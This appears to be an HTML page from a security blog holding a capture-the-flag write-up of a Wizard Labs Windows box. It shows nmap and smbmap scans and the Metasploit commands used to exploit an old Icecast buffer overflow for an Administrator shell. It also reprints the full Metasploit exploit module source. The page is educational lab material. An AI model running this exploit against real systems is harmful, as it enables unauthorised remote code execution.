@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.5.0 -->
+<title>Wizard Labs - Dummy | 0xRick Owned Root !</title>
+<meta name="generator" content="Jekyll v3.7.4" />
+<meta property="og:title" content="Wizard Labs - Dummy" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Quick Summary Hey guys this is my write-up about Dummy from Wizard Labs. If you don’t know them , They are a new penetration testing lab, They have 16 boxes so far and Dummy is their first box to retire. This lab is nice I definitely recommend checking it out. Dummy is a windows box and it was an easy one (Difficulty: 2/10). It had an http service which was vulnerable to a buffer overflow , and metasploit had a module for it so this box can be done easily through metasploit . I will show that, then we will take a look at the exploit and how it’s happening. The ip of the box is 10.1.1.13 so let’s jump right in. Nmap As we always do we will start by scanning the box with nmap , so : nmap -sV -sT -sC 10.1.1.13 We see a lot of open ports , most of the http ports are running Microsoft HTTPAPI, we will ignore that and look at other things. We also see that the box has smb which is an interesting thing to look at so let’s try smbmap smbmap -H 10.1.1.13 And we immediately get Access Denied so smb is not helpful here. On port 8000 there’s an http server and it’s not running Microsoft HTTPAPI , it’s running Icecast streaming media server. Let’s check that port Icecast If we go to that port we get a 404 response which is odd. We can try bruteforcing directories with dirbuster but that won’t help too much. By searching online we will find that an old version of icecast had a buffer overflow vulnerability which allowed for a remote command execution (RCE). And we also find a metasploit module . So let’s open metasploit and search for icecast modules. Metasploit By doing search icecast we will find the module , and it’s an exploit from 2004. use windows/http/icecast_header set LHOST 10.253.xx.xx set RHOST 10.1.1.13 exploit And we got a meterpreter session. we can drop a shell by typing shell then if we type whoami we will find that we are already Administrator so no need for privilege escalation Then we can grab the flags Header Overwrite So now we did the box , but let’s understand the exploit. basically it’s a buffer overflow vulnerability, it happens because that version of icecast only accepted a maximum of 32 headers in the HTTP request , so if a request had 32 headers this caused the return address of the vulnerable function to be overwritten with a pointer to the begining of the header number 32. this means that anything we add as the 32nd header will be executed So if we make a request with 31 headers and add shellcode as the 32nd header we can get a reverse shell and that’s what metasploit is doing. But if we look at the source of the module : ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ## class MetasploitModule &lt; Msf::Exploit::Remote Rank = GreatRanking include Msf::Exploit::Remote::Tcp def initialize(info = {}) super(update_info(info, &#39;Name&#39; =&gt; &#39;Icecast Header Overwrite&#39;, &#39;Description&#39; =&gt; %q{ This module exploits a buffer overflow in the header parsing of icecast versions 2.0.1 and earlier, discovered by Luigi Auriemma. Sending 32 HTTP headers will cause a write one past the end of a pointer array. On win32 this happens to overwrite the saved instruction pointer, and on linux (depending on compiler, etc) this seems to generally overwrite nothing crucial (read not exploitable). This exploit uses ExitThread(), this will leave icecast thinking the thread is still in use, and the thread counter won&#39;t be decremented. This means for each time your payload exits, the counter will be left incremented, and eventually the threadpool limit will be maxed. So you can multihit, but only till you fill the threadpool. }, &#39;Author&#39; =&gt; [ &#39;spoonm&#39;, &#39;Luigi Auriemma &lt;aluigi[at]autistici.org&gt;&#39; ], &#39;License&#39; =&gt; MSF_LICENSE, &#39;References&#39; =&gt; [ [ &#39;CVE&#39;, &#39;2004-1561&#39;], [ &#39;OSVDB&#39;, &#39;10406&#39;], [ &#39;BID&#39;, &#39;11271&#39;], [ &#39;URL&#39;, &#39;http://archives.neohapsis.com/archives/bugtraq/2004-09/0366.html&#39;], ], &#39;Privileged&#39; =&gt; false, &#39;DefaultOptions&#39; =&gt; { &#39;EXITFUNC&#39; =&gt; &#39;thread&#39;, }, &#39;Payload&#39; =&gt; { &#39;Space&#39; =&gt; 2000, &#39;BadChars&#39; =&gt; &quot;\x0d\x0a\x00&quot;, &#39;DisableNops&#39; =&gt; true, &#39;StackAdjustment&#39; =&gt; -3500, }, &#39;Platform&#39; =&gt; &#39;win&#39;, &#39;Targets&#39; =&gt; [ [ &#39;Automatic&#39;, { }], ], &#39;DisclosureDate&#39; =&gt; &#39;Sep 28 2004&#39;, &#39;DefaultTarget&#39; =&gt; 0)) register_options( [ Opt::RPORT(8000) ]) end # Interesting that ebp is pushed after the local variables, and the line array # is right before the saved eip, so overrunning it just by 1 element overwrites # eip, making an interesting exploit.... # .text:00414C00 sub esp, 94h # .text:00414C06 push ebx # .text:00414C07 push ebp # .text:00414C08 push esi def exploit connect # bounce bounce bouncey bounce.. (our chunk gets free&#39;d, so do a little dance) # jmp 12 evul = &quot;\xeb\x0c / HTTP/1.1 #{payload.encoded}\r\n&quot; evul &lt;&lt; &quot;Accept: text/html\r\n&quot; * 31; # jmp [esp+4] evul &lt;&lt; &quot;\xff\x64\x24\x04\r\n&quot; evul &lt;&lt; &quot;\r\n&quot; sock.put(evul) handler disconnect end end There’s not much detail because it’s based on metasploit so luckily I found this refrence which had a poc c code. By looking at this part of the code : We can see how the exploit is working. It’s doing a GET request , adding 31 “a”s as headers , then the 32nd header is the shellcode. If you want to know more about bufferOverFlows check out my other articles That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading." />
+<meta property="og:description" content="Quick Summary Hey guys this is my write-up about Dummy from Wizard Labs. If you don’t know them , They are a new penetration testing lab, They have 16 boxes so far and Dummy is their first box to retire. This lab is nice I definitely recommend checking it out. Dummy is a windows box and it was an easy one (Difficulty: 2/10). It had an http service which was vulnerable to a buffer overflow , and metasploit had a module for it so this box can be done easily through metasploit . I will show that, then we will take a look at the exploit and how it’s happening. The ip of the box is 10.1.1.13 so let’s jump right in. Nmap As we always do we will start by scanning the box with nmap , so : nmap -sV -sT -sC 10.1.1.13 We see a lot of open ports , most of the http ports are running Microsoft HTTPAPI, we will ignore that and look at other things. We also see that the box has smb which is an interesting thing to look at so let’s try smbmap smbmap -H 10.1.1.13 And we immediately get Access Denied so smb is not helpful here. On port 8000 there’s an http server and it’s not running Microsoft HTTPAPI , it’s running Icecast streaming media server. Let’s check that port Icecast If we go to that port we get a 404 response which is odd. We can try bruteforcing directories with dirbuster but that won’t help too much. By searching online we will find that an old version of icecast had a buffer overflow vulnerability which allowed for a remote command execution (RCE). And we also find a metasploit module . So let’s open metasploit and search for icecast modules. Metasploit By doing search icecast we will find the module , and it’s an exploit from 2004. use windows/http/icecast_header set LHOST 10.253.xx.xx set RHOST 10.1.1.13 exploit And we got a meterpreter session. we can drop a shell by typing shell then if we type whoami we will find that we are already Administrator so no need for privilege escalation Then we can grab the flags Header Overwrite So now we did the box , but let’s understand the exploit. basically it’s a buffer overflow vulnerability, it happens because that version of icecast only accepted a maximum of 32 headers in the HTTP request , so if a request had 32 headers this caused the return address of the vulnerable function to be overwritten with a pointer to the begining of the header number 32. this means that anything we add as the 32nd header will be executed So if we make a request with 31 headers and add shellcode as the 32nd header we can get a reverse shell and that’s what metasploit is doing. But if we look at the source of the module : ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ## class MetasploitModule &lt; Msf::Exploit::Remote Rank = GreatRanking include Msf::Exploit::Remote::Tcp def initialize(info = {}) super(update_info(info, &#39;Name&#39; =&gt; &#39;Icecast Header Overwrite&#39;, &#39;Description&#39; =&gt; %q{ This module exploits a buffer overflow in the header parsing of icecast versions 2.0.1 and earlier, discovered by Luigi Auriemma. Sending 32 HTTP headers will cause a write one past the end of a pointer array. On win32 this happens to overwrite the saved instruction pointer, and on linux (depending on compiler, etc) this seems to generally overwrite nothing crucial (read not exploitable). This exploit uses ExitThread(), this will leave icecast thinking the thread is still in use, and the thread counter won&#39;t be decremented. This means for each time your payload exits, the counter will be left incremented, and eventually the threadpool limit will be maxed. So you can multihit, but only till you fill the threadpool. }, &#39;Author&#39; =&gt; [ &#39;spoonm&#39;, &#39;Luigi Auriemma &lt;aluigi[at]autistici.org&gt;&#39; ], &#39;License&#39; =&gt; MSF_LICENSE, &#39;References&#39; =&gt; [ [ &#39;CVE&#39;, &#39;2004-1561&#39;], [ &#39;OSVDB&#39;, &#39;10406&#39;], [ &#39;BID&#39;, &#39;11271&#39;], [ &#39;URL&#39;, &#39;http://archives.neohapsis.com/archives/bugtraq/2004-09/0366.html&#39;], ], &#39;Privileged&#39; =&gt; false, &#39;DefaultOptions&#39; =&gt; { &#39;EXITFUNC&#39; =&gt; &#39;thread&#39;, }, &#39;Payload&#39; =&gt; { &#39;Space&#39; =&gt; 2000, &#39;BadChars&#39; =&gt; &quot;\x0d\x0a\x00&quot;, &#39;DisableNops&#39; =&gt; true, &#39;StackAdjustment&#39; =&gt; -3500, }, &#39;Platform&#39; =&gt; &#39;win&#39;, &#39;Targets&#39; =&gt; [ [ &#39;Automatic&#39;, { }], ], &#39;DisclosureDate&#39; =&gt; &#39;Sep 28 2004&#39;, &#39;DefaultTarget&#39; =&gt; 0)) register_options( [ Opt::RPORT(8000) ]) end # Interesting that ebp is pushed after the local variables, and the line array # is right before the saved eip, so overrunning it just by 1 element overwrites # eip, making an interesting exploit.... # .text:00414C00 sub esp, 94h # .text:00414C06 push ebx # .text:00414C07 push ebp # .text:00414C08 push esi def exploit connect # bounce bounce bouncey bounce.. (our chunk gets free&#39;d, so do a little dance) # jmp 12 evul = &quot;\xeb\x0c / HTTP/1.1 #{payload.encoded}\r\n&quot; evul &lt;&lt; &quot;Accept: text/html\r\n&quot; * 31; # jmp [esp+4] evul &lt;&lt; &quot;\xff\x64\x24\x04\r\n&quot; evul &lt;&lt; &quot;\r\n&quot; sock.put(evul) handler disconnect end end There’s not much detail because it’s based on metasploit so luckily I found this refrence which had a poc c code. By looking at this part of the code : We can see how the exploit is working. It’s doing a GET request , adding 31 “a”s as headers , then the 32nd header is the shellcode. If you want to know more about bufferOverFlows check out my other articles That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading." />
+<link rel="canonical" href="http://localhost:4000/wizard-labs/dummy/" />
+<meta property="og:url" content="http://localhost:4000/wizard-labs/dummy/" />
+<meta property="og:site_name" content="0xRick Owned Root !" />
+<meta property="og:image" content="http://localhost:4000/wizardlabs/dummy/0.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2019-01-20T00:00:00+02:00" />
+<script type="application/ld+json">
+{"datePublished":"2019-01-20T00:00:00+02:00","image":"http://localhost:4000/wizardlabs/dummy/0.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/wizard-labs/dummy/"},"@type":"BlogPosting","url":"http://localhost:4000/wizard-labs/dummy/","headline":"Wizard Labs - Dummy","description":"Quick Summary Hey guys this is my write-up about Dummy from Wizard Labs. If you don’t know them , They are a new penetration testing lab, They have 16 boxes so far and Dummy is their first box to retire. This lab is nice I definitely recommend checking it out. Dummy is a windows box and it was an easy one (Difficulty: 2/10). It had an http service which was vulnerable to a buffer overflow , and metasploit had a module for it so this box can be done easily through metasploit . I will show that, then we will take a look at the exploit and how it’s happening. The ip of the box is 10.1.1.13 so let’s jump right in. Nmap As we always do we will start by scanning the box with nmap , so : nmap -sV -sT -sC 10.1.1.13 We see a lot of open ports , most of the http ports are running Microsoft HTTPAPI, we will ignore that and look at other things. We also see that the box has smb which is an interesting thing to look at so let’s try smbmap smbmap -H 10.1.1.13 And we immediately get Access Denied so smb is not helpful here. On port 8000 there’s an http server and it’s not running Microsoft HTTPAPI , it’s running Icecast streaming media server. Let’s check that port Icecast If we go to that port we get a 404 response which is odd. We can try bruteforcing directories with dirbuster but that won’t help too much. By searching online we will find that an old version of icecast had a buffer overflow vulnerability which allowed for a remote command execution (RCE). And we also find a metasploit module . So let’s open metasploit and search for icecast modules. Metasploit By doing search icecast we will find the module , and it’s an exploit from 2004. use windows/http/icecast_header set LHOST 10.253.xx.xx set RHOST 10.1.1.13 exploit And we got a meterpreter session. we can drop a shell by typing shell then if we type whoami we will find that we are already Administrator so no need for privilege escalation Then we can grab the flags Header Overwrite So now we did the box , but let’s understand the exploit. basically it’s a buffer overflow vulnerability, it happens because that version of icecast only accepted a maximum of 32 headers in the HTTP request , so if a request had 32 headers this caused the return address of the vulnerable function to be overwritten with a pointer to the begining of the header number 32. this means that anything we add as the 32nd header will be executed So if we make a request with 31 headers and add shellcode as the 32nd header we can get a reverse shell and that’s what metasploit is doing. But if we look at the source of the module : ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ## class MetasploitModule &lt; Msf::Exploit::Remote Rank = GreatRanking include Msf::Exploit::Remote::Tcp def initialize(info = {}) super(update_info(info, &#39;Name&#39; =&gt; &#39;Icecast Header Overwrite&#39;, &#39;Description&#39; =&gt; %q{ This module exploits a buffer overflow in the header parsing of icecast versions 2.0.1 and earlier, discovered by Luigi Auriemma. Sending 32 HTTP headers will cause a write one past the end of a pointer array. On win32 this happens to overwrite the saved instruction pointer, and on linux (depending on compiler, etc) this seems to generally overwrite nothing crucial (read not exploitable). This exploit uses ExitThread(), this will leave icecast thinking the thread is still in use, and the thread counter won&#39;t be decremented. This means for each time your payload exits, the counter will be left incremented, and eventually the threadpool limit will be maxed. So you can multihit, but only till you fill the threadpool. }, &#39;Author&#39; =&gt; [ &#39;spoonm&#39;, &#39;Luigi Auriemma &lt;aluigi[at]autistici.org&gt;&#39; ], &#39;License&#39; =&gt; MSF_LICENSE, &#39;References&#39; =&gt; [ [ &#39;CVE&#39;, &#39;2004-1561&#39;], [ &#39;OSVDB&#39;, &#39;10406&#39;], [ &#39;BID&#39;, &#39;11271&#39;], [ &#39;URL&#39;, &#39;http://archives.neohapsis.com/archives/bugtraq/2004-09/0366.html&#39;], ], &#39;Privileged&#39; =&gt; false, &#39;DefaultOptions&#39; =&gt; { &#39;EXITFUNC&#39; =&gt; &#39;thread&#39;, }, &#39;Payload&#39; =&gt; { &#39;Space&#39; =&gt; 2000, &#39;BadChars&#39; =&gt; &quot;\\x0d\\x0a\\x00&quot;, &#39;DisableNops&#39; =&gt; true, &#39;StackAdjustment&#39; =&gt; -3500, }, &#39;Platform&#39; =&gt; &#39;win&#39;, &#39;Targets&#39; =&gt; [ [ &#39;Automatic&#39;, { }], ], &#39;DisclosureDate&#39; =&gt; &#39;Sep 28 2004&#39;, &#39;DefaultTarget&#39; =&gt; 0)) register_options( [ Opt::RPORT(8000) ]) end # Interesting that ebp is pushed after the local variables, and the line array # is right before the saved eip, so overrunning it just by 1 element overwrites # eip, making an interesting exploit.... # .text:00414C00 sub esp, 94h # .text:00414C06 push ebx # .text:00414C07 push ebp # .text:00414C08 push esi def exploit connect # bounce bounce bouncey bounce.. (our chunk gets free&#39;d, so do a little dance) # jmp 12 evul = &quot;\\xeb\\x0c / HTTP/1.1 #{payload.encoded}\\r\\n&quot; evul &lt;&lt; &quot;Accept: text/html\\r\\n&quot; * 31; # jmp [esp+4] evul &lt;&lt; &quot;\\xff\\x64\\x24\\x04\\r\\n&quot; evul &lt;&lt; &quot;\\r\\n&quot; sock.put(evul) handler disconnect end end There’s not much detail because it’s based on metasploit so luckily I found this refrence which had a poc c code. By looking at this part of the code : We can see how the exploit is working. It’s doing a GET request , adding 31 “a”s as headers , then the 32nd header is the shellcode. If you want to know more about bufferOverFlows check out my other articles That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading.","dateModified":"2019-01-20T00:00:00+02:00","@context":"http://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/ad.css">
+  <link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="0xRick Owned Root !" /></head>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-97164925-2');
+</script>
+
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">0xRick Owned Root !</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a><a class="page-link" href="/categories/">Categories</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Wizard Labs - Dummy</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2019-01-20T00:00:00+02:00" itemprop="datePublished">Jan 20, 2019
+      </time><script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script>
+</p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <hr />
+
+<h3 id="quick-summary">Quick Summary</h3>
+<h4 id="hey-guys-this-is-my-write-up-about-dummy-from-wizard-labs-if-you-dont-know-them--they-are-a-new-penetration-testing-lab-they-have-16-boxes-so-far-and-dummy-is-their-first-box-to-retire-this-lab-is-nice-i-definitely-recommend-checking-it-out-dummy-is-a-windows-box-and-it-was-an-easy-one-difficulty-210-it-had-an-http-service-which-was-vulnerable-to-a-buffer-overflow--and-metasploit-had-a-module-for-it-so-this-box-can-be-done-easily-through-metasploit--i-will-show-that-then-we-will-take-a-look-at-the-exploit-and-how-its-happening-the-ip-of-the-box-is-101113-so-lets-jump-right-in">Hey guys this is my write-up about Dummy from <a href="https://labs.wizard-security.net/">Wizard Labs</a>. If you don’t know them , They are a new penetration testing lab, They have 16 boxes so far and Dummy is their first box to retire. This lab is nice I definitely recommend checking it out. Dummy is a windows box and it was an easy one (Difficulty: 2/10). It had an http service which was vulnerable to a buffer overflow , and metasploit had a module for it so this box can be done easily through metasploit . I will show that, then we will take a look at the exploit and how it’s happening. The ip of the box is 10.1.1.13 so let’s jump right in.</h4>
+<p><img src="/images/wizardlabs/dummy/0.png" alt="" /></p>
+<hr />
+
+<h3 id="nmap">Nmap</h3>
+<h4 id="as-we-always-do-we-will-start-by-scanning-the-box-with-nmap--so-">As we always do we will start by scanning the box with nmap , so :</h4>
+<p><code class="highlighter-rouge">nmap -sV -sT -sC 10.1.1.13</code>
+<img src="/images/wizardlabs/dummy/1.png" alt="" /></p>
+<h4 id="we-see-a-lot-of-open-ports--most-of-the-http-ports-are-running-microsoft-httpapi-we-will-ignore-that-and-look-at-other-things-we-also-see-that-the-box-has-smb-which-is-an-interesting-thing-to-look-at-so-lets-try-smbmap">We see a lot of open ports , most of the http ports are running Microsoft HTTPAPI, we will ignore that and look at other things. We also see that the box has smb which is an interesting thing to look at so let’s try smbmap</h4>
+<p><code class="highlighter-rouge">smbmap -H 10.1.1.13</code>
+<img src="/images/wizardlabs/dummy/2.png" alt="" /></p>
+<h4 id="and-we-immediately-get-access-denied-so-smb-is-not-helpful-here">And we immediately get Access Denied so smb is not helpful here.</h4>
+<h4 id="on-port-8000-theres-an-http-server-and-its-not-running-microsoft-httpapi--its-running-icecast-streaming-media-server-lets-check-that-port">On port 8000 there’s an http server and it’s not running Microsoft HTTPAPI , it’s running <a href="http://icecast.org/">Icecast streaming media server</a>. Let’s check that port</h4>
+<p><br /></p>
+<hr />
+
+<h3 id="icecast">Icecast</h3>
+<p><img src="/images/wizardlabs/dummy/3.png" alt="" /></p>
+<h4 id="if-we-go-to-that-port-we-get-a-404-response-which-is-odd-we-can-try-bruteforcing-directories-with-dirbuster-but-that-wont-help-too-much">If we go to that port we get a 404 response which is odd. We can try bruteforcing directories with dirbuster but that won’t help too much.</h4>
+<h4 id="by-searching-online-we-will-find-that-an-old-version-of-icecast-had-a-buffer-overflow-vulnerability-which-allowed-for-a-remote-command-execution-rce-and-we-also-find-a-metasploit-module--so-lets-open-metasploit-and-search-for-icecast-modules">By searching online we will find that an old version of icecast had a buffer overflow vulnerability which allowed for a remote command execution (RCE). And we also find a <a href="https://www.rapid7.com/db/modules/exploit/windows/http/icecast_header">metasploit module</a> . So let’s open metasploit and search for icecast modules.</h4>
+<p><br /></p>
+<hr />
+
+<h3 id="metasploit">Metasploit</h3>
+<h4 id="by-doing-search-icecast-we-will-find-the-module--and-its-an-exploit-from-2004">By doing <code class="highlighter-rouge">search icecast</code> we will find the module , and it’s an exploit from 2004.</h4>
+<p><img src="/images/wizardlabs/dummy/4.png" alt="" />
+<code class="highlighter-rouge">use windows/http/icecast_header</code>
+<br />
+<code class="highlighter-rouge">set LHOST 10.253.xx.xx</code>
+<br />
+<code class="highlighter-rouge">set RHOST 10.1.1.13</code>
+<br />
+<code class="highlighter-rouge">exploit</code>
+<img src="/images/wizardlabs/dummy/5.png" alt="" /></p>
+<h4 id="and-we-got-a-meterpreter-session-we-can-drop-a-shell-by-typing-shell-then-if-we-type-whoami-we-will-find-that-we-are-already-administrator-so-no-need-for-privilege-escalation">And we got a meterpreter session. we can drop a shell by typing <code class="highlighter-rouge">shell</code> then if we type <code class="highlighter-rouge">whoami</code> we will find that we are already Administrator so no need for privilege escalation</h4>
+<p><img src="/images/wizardlabs/dummy/6.png" alt="" /></p>
+<h4 id="then-we-can-grab-the-flags">Then we can grab the flags</h4>
+<p><img src="/images/wizardlabs/dummy/7.png" alt="" /></p>
+<hr />
+
+<h3 id="header-overwrite">Header Overwrite</h3>
+<h4 id="so-now-we-did-the-box--but-lets-understand-the-exploit-basically-its-a-buffer-overflow-vulnerability-it-happens-because-that-version-of-icecast-only-accepted-a-maximum-of-32-headers-in-the-http-request--so-if-a-request-had-32-headers-this-caused-the-return-address-of-the-vulnerable-function-to-be-overwritten-with-a-pointer-to-the-begining-of-the-header-number-32-this-means-that-anything-we-add-as-the-32nd-header-will-be-executed">So now we did the box , but let’s understand the exploit. basically it’s a buffer overflow vulnerability, it happens because that version of icecast only accepted a maximum of 32 headers in the HTTP request , so if a request had 32 headers this caused the return address of the vulnerable function to be overwritten with a pointer to the begining of the header number 32. this means that anything we add as the 32nd header will be executed</h4>
+<h4 id="so-if-we-make-a-request-with-31-headers-and-add-shellcode-as-the-32nd-header-we-can-get-a-reverse-shell-and-thats-what-metasploit-is-doing-but-if-we-look-at-the-source-of-the-module-">So if we make a request with 31 headers and add shellcode as the 32nd header we can get a reverse shell and that’s what metasploit is doing. But if we look at the <a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/http/icecast_header.rb">source</a> of the module :</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule &lt; Msf::Exploit::Remote
+  Rank = GreatRanking
+
+  include Msf::Exploit::Remote::Tcp
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           =&gt; 'Icecast Header Overwrite',
+      'Description'    =&gt; %q{
+        This module exploits a buffer overflow in the header parsing of icecast
+        versions 2.0.1 and earlier, discovered by Luigi Auriemma. Sending 32
+        HTTP headers will cause a write one past the end of a pointer array. On
+        win32 this happens to overwrite the saved instruction pointer, and on
+        linux (depending on compiler, etc) this seems to generally overwrite
+        nothing crucial (read not exploitable).
+
+        This exploit uses ExitThread(), this will leave icecast thinking the
+        thread is still in use, and the thread counter won't be decremented.
+        This means for each time your payload exits, the counter will be left
+        incremented, and eventually the threadpool limit will be maxed. So you
+        can multihit, but only till you fill the threadpool.
+      },
+      'Author'         =&gt; [ 'spoonm', 'Luigi Auriemma &lt;aluigi[at]autistici.org&gt;' ],
+      'License'        =&gt; MSF_LICENSE,
+      'References'     =&gt;
+        [
+          [ 'CVE', '2004-1561'],
+          [ 'OSVDB', '10406'],
+          [ 'BID', '11271'],
+          [ 'URL', 'http://archives.neohapsis.com/archives/bugtraq/2004-09/0366.html'],
+        ],
+      'Privileged'     =&gt; false,
+      'DefaultOptions' =&gt;
+        {
+          'EXITFUNC' =&gt; 'thread',
+        },
+      'Payload'        =&gt;
+        {
+          'Space'    =&gt; 2000,
+          'BadChars' =&gt; "\x0d\x0a\x00",
+          'DisableNops' =&gt; true,
+          'StackAdjustment' =&gt; -3500,
+        },
+      'Platform'       =&gt; 'win',
+      'Targets'        =&gt;
+        [
+          [ 'Automatic', { }],
+        ],
+      'DisclosureDate' =&gt; 'Sep 28 2004',
+      'DefaultTarget' =&gt; 0))
+
+    register_options(
+      [
+        Opt::RPORT(8000)
+      ])
+  end
+
+  # Interesting that ebp is pushed after the local variables, and the line array
+  # is right before the saved eip, so overrunning it just by 1 element overwrites
+  # eip, making an interesting exploit....
+  # .text:00414C00                 sub     esp, 94h
+  # .text:00414C06                 push    ebx
+  # .text:00414C07                 push    ebp
+  # .text:00414C08                 push    esi
+
+  def exploit
+    connect
+
+    # bounce bounce bouncey bounce.. (our chunk gets free'd, so do a little dance)
+    # jmp 12
+    evul = "\xeb\x0c / HTTP/1.1 #{payload.encoded}\r\n"
+    evul &lt;&lt; "Accept: text/html\r\n" * 31;
+
+    # jmp [esp+4]
+    evul &lt;&lt; "\xff\x64\x24\x04\r\n"
+    evul &lt;&lt; "\r\n"
+
+    sock.put(evul)
+
+    handler
+    disconnect
+  end
+end
+
+</code></pre></div></div>
+<h4 id="theres-not-much-detail-because-its-based-on-metasploit-so-luckily-i-found-this-refrence-which-had-a-poc-c-code">There’s not much detail because it’s based on metasploit so luckily I found this <a href="https://securitytracker.com/id/1011439">refrence</a> which had a poc c code.</h4>
+<h4 id="by-looking-at-this-part-of-the-code-">By looking at this part of the code :</h4>
+<p><img src="/images/wizardlabs/dummy/8.png" alt="" /></p>
+<h4 id="we-can-see-how-the-exploit-is-working-its-doing-a-get-request--adding-31-as-as-headers--then-the-32nd-header-is-the-shellcode">We can see how the exploit is working. It’s doing a GET request , adding 31 “a”s as headers , then the 32nd header is the shellcode.</h4>
+<h4 id="if-you-want-to-know-more-about-bufferoverflows-check-out-my-other-articles">If you want to know more about bufferOverFlows check out my <a href="/categories">other articles</a></h4>
+<p><br />
+<br /></p>
+<h4 id="thats-it--feedback-is-appreciated-">That’s it , Feedback is appreciated !</h4>
+<h4 id="dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham">Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter for awesome resources <a href="https://twitter.com/Ahm3d_H3sham">@Ahm3d_H3sham</a></h4>
+<h4 id="thanks-for-reading">Thanks for reading.</h4>
+<hr />
+
+
+  </div>
+<script src="https://www.hackthebox.eu/badge/65598"></script><a class="u-url" href="/wizard-labs/dummy/" hidden></a>
+</article>
+
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">0xRick Owned Root !</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">0xRick Owned Root !</li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://www.facebook.com/Ahm3d.H3sham"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#facebook"></use></svg> <span class="username">Ahm3d.H3sham</span></a></li><li><a href="https://github.com/0xRick"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">0xRick</span></a></li><li><a href="https://www.twitter.com/Ahm3d_H3sham"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">Ahm3d_H3sham</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
+
